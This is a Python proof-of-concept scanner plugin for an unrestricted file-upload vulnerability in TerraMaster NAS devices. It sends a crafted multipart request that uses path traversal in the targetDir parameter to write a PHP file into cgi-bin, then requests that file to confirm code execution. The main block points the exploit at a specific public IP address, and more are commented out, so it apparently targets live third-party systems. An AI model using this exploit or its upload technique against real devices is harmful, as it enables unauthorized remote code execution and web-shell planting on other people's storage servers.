#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  TerraMaster NAS网络存储服务器无限制getshell
Author    :  a
mail      :  a@lcx.cc
 
 
"""
import urlparse

def assign(service, arg):
    if service == 'terramaster':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    raw = """POST /include/upload.php?targetDir=../cgi-bin/filemanage/ HTTP/1.1
Accept: text/*
Content-Type: multipart/form-data; boundary=----------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
User-Agent: Shockwave Flash
Host: 218.92.26.50:8080
Content-Length: 721
Proxy-Connection: Keep-Alive
Pragma: no-cache
Cookie: PHPSESSID=

------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="Filename"

1.php
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="name"

1.php
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="chunk"

0
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="chunks"

1
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

<?php echo (199995555555+3565488);?>
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="Upload"

Submit Query
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3--"""
    url = arg + 'include/upload.php?targetDir=../cgi-bin/filemanage/'
    code2, head, res, errcode, _ = curl.curl2(url ,raw =raw)
    code2, head, res, errcode, _ = curl.curl2(arg + 'cgi-bin/filemanage/1.php')
    if (code2 == 200) and (res == '199999121043'):
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    #audit(assign('terramaster', 'http://121.58.191.83')[1])
    #audit(assign('terramaster', 'http://121.69.22.226')[1])
    #audit(assign('terramaster', 'http://222.51.44.212:8080/')[1])
    audit(assign('terramaster', 'http://218.92.26.50:8080/')[1])